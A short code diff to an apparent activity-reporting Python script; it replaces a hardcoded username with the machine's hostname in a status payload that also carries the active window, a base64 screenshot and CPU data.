@@ -113,7 +113,7 @@ def main():
         data = {
             "status": "active",
             "window": window,
-            "user": "LuthfiKim",
+            "user": socket.gethostname(),
             "device": "Windows",
             "screen": screen_b64,
             "cpu": cpu,
